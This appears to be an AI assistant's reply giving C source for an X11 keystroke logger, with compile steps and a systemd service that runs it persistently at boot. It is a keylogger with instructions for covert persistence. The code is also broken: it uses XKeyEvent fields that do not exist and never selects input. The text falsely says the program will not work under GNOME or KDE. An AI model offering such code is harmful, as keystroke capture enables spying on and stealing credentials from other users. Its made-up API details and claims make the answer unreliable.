Creating a program to log keystrokes in Xorg can be done using Xorg's built-in XKey Events. Here's a C program that demonstrates how to do it:

```c
#include <X11/Xlib.h>
#include <stdio.h>

int main() {
    Display *dpy;
    XEvent ev;
    int trapping = 0;

    dpy = XOpenDisplay(NULL);
    if (dpy == NULL) {
        fprintf(stderr, "Cannot open display\n");
        return 1;
    }

    while (1) {
        XNextEvent(dpy, &ev);

        if (ev.type == KeyPress) {
            fprintf(stderr, "KeyPress: %d\n", ev.xkey.keycode);
            printf("Press: ");
            for (int i = 0; i < ev.xkey.length; i++) {
                fprintf(stderr, "%c", ev.xkey.xkey_contents[i]);
            }
            fprintf(stderr, "\n");

        } else if (ev.type == KeyRelease) {
            fprintf(stderr, "KeyRelease: %d\n", ev.xkey.keycode);
        }
    }

    XCloseDisplay(dpy);

    return 0;
}
```

This program listens for `KeyPress` and `KeyRelease` events and prints out the corresponding information (key code, keypress/release, and the characters if it's a printable key).

To compile and run the program:

1. Install the Xlib development package. For example, on Ubuntu/Debian-based systems, you can run `sudo apt-get install libx11-dev`.
2. Compile the program using the command `gcc keystroke_logger.c -o keystroke_logger -lX11`.
3. Run the program using the command `./keystroke_logger`.

Note that this program will continue running until you stop it manually. Also, since it's a C program, you'll need to run it in the terminal, and it won't work in a graphical environment like GNOME or KDE.

If you want to run this program as a background daemon, you can use a service manager like systemd. Create a file called `keystroke_logger.service` with the following contents:

```
[Unit]
Description=Keystroke Logger
After=network.target

[Service]
User=<your_username>
ExecStart=<path_to_your_keyboard_logger_binary>
Restart=always

[Install]
WantedBy=multi-user.target
```

Replace `<your_username>` and `<path_to_your_keyboard_logger_binary>` with your actual username and the path to the compiled keyboard logger binary.

Load the service with the command `sudo systemctl daemon-reload` and start it with `sudo systemctl start keystroke_logger`. To enable it to start automatically at boot, run `sudo systemctl enable keystroke_logger`.<|start_header_id|>assistant<|end_header_id|>

